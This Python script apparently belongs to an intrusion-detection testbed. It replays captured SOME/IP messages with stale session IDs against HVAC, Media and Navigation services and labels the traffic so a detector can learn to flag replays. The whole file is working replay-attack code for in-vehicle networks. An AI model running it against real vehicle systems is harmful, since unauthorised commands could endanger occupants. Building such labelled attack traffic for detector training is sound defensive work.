"""
Replay attack — captures a recent legitimate message from the traffic log
and re-sends it out of sequence.

The replayed message will have a stale/duplicate session ID, which is one
of the key features the detector should learn to flag.

Usage:
    python -m attacks.replay [--target-service HVAC|Media|Navigation] [--count 5] [--delay 0.5]
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import random
import socket
import struct
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from proto.someip import SomeIpHeader, SomeIpMessage, pack_someip, MessageType
from proto.constants import SERVICES, HVAC_SERVICE_ID, MEDIA_SERVICE_ID, NAV_SERVICE_ID
from client.traffic_logger import get_logger

logging.basicConfig(level=logging.INFO, format="%(asctime)s [REPLAY] %(message)s")
log = logging.getLogger("Replay")

SERVICE_MAP = {
    "HVAC": HVAC_SERVICE_ID,
    "Media": MEDIA_SERVICE_ID,
    "Navigation": NAV_SERVICE_ID,
}


def load_recent_messages(log_path: str, service_id: int = None, count: int = 50):
    """Load recent messages from the traffic log."""
    messages = []
    try:
        with open(log_path, "r") as f:
            for line in f:
                try:
                    record = json.loads(line.strip())
                    if service_id is not None:
                        rec_sid = int(record.get("service_id", "0"), 16)
                        if rec_sid != service_id:
                            continue
                    if record.get("message_type") in ("REQUEST", "RESPONSE"):
                        messages.append(record)
                except (json.JSONDecodeError, ValueError):
                    continue
    except FileNotFoundError:
        log.error("Traffic log not found: %s", log_path)
        return []

    return messages[-count:]  # last N messages


def replay_message(record: dict, sock: socket.socket, target_ip: str, target_port: int, logger):
    """Re-send a captured message exactly as-is (stale session ID)."""
    header = SomeIpHeader(
        service_id=int(record["service_id"], 16),
        method_id=int(record["method_id"], 16),
        client_id=int(record["client_id"], 16),
        session_id=int(record["session_id"], 16),  # STALE — this is the attack signal
        message_type=MessageType.REQUEST,
    )
    payload = bytes.fromhex(record.get("payload_hex", "").replace("...", ""))
    msg_bytes = pack_someip(SomeIpMessage(header=header, payload=payload))

    sock.sendto(msg_bytes, (target_ip, target_port))

    # Log as attack
    logger.log(
        header, payload, direction="sent",
        src_ip="attacker", dst_ip=target_ip,
        label="replay",
    )
    log.info(
        "REPLAYED msg: service=0x%04X method=0x%04X session=0x%04X → %s:%d",
        header.service_id, header.method_id, header.session_id,
        target_ip, target_port,
    )


def main():
    parser = argparse.ArgumentParser(description="SOME/IP Replay Attack")
    parser.add_argument("--target-service", choices=["HVAC", "Media", "Navigation"], default="HVAC")
    parser.add_argument("--target-ip", default="172.20.0.10")
    parser.add_argument("--target-port", type=int, default=None)
    parser.add_argument("--count", type=int, default=5, help="Number of messages to replay")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between replays (seconds)")
    parser.add_argument("--log-path", default="/logs/traffic.jsonl")
    args = parser.parse_args()

    service_id = SERVICE_MAP[args.target_service]
    target_port = args.target_port or SERVICES[service_id]["port"]

    logger = get_logger(args.log_path)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    log.info("Loading recent messages for %s...", args.target_service)
    messages = load_recent_messages(args.log_path, service_id)

    if not messages:
        log.warning("No messages found to replay. Generating synthetic replay instead.")
        # Create a synthetic message if no log data available
        methods = SERVICES[service_id]["methods"]
        method_name, method_id = next(iter(methods.items()))
        for i in range(args.count):
            header = SomeIpHeader(
                service_id=service_id,
                method_id=method_id,
                client_id=0x0010,
                session_id=0x0001,  # Always same session — suspicious
                message_type=MessageType.REQUEST,
            )
            payload = struct.pack("!Hf", 1, 22.0) if args.target_service == "HVAC" else b""
            msg_bytes = pack_someip(SomeIpMessage(header=header, payload=payload))
            sock.sendto(msg_bytes, (args.target_ip, target_port))
            logger.log(header, payload, direction="sent", src_ip="attacker", dst_ip=args.target_ip, label="replay")
            log.info("REPLAY synthetic #%d → %s:%d", i + 1, args.target_ip, target_port)
            time.sleep(args.delay)
    else:
        selected = random.choices(messages, k=min(args.count, len(messages)))
        for i, record in enumerate(selected):
            replay_message(record, sock, args.target_ip, target_port, logger)
            if i < len(selected) - 1:
                time.sleep(args.delay)

    log.info("Replay attack complete: %d messages sent", args.count)
    sock.close()


if __name__ == "__main__":
    main()
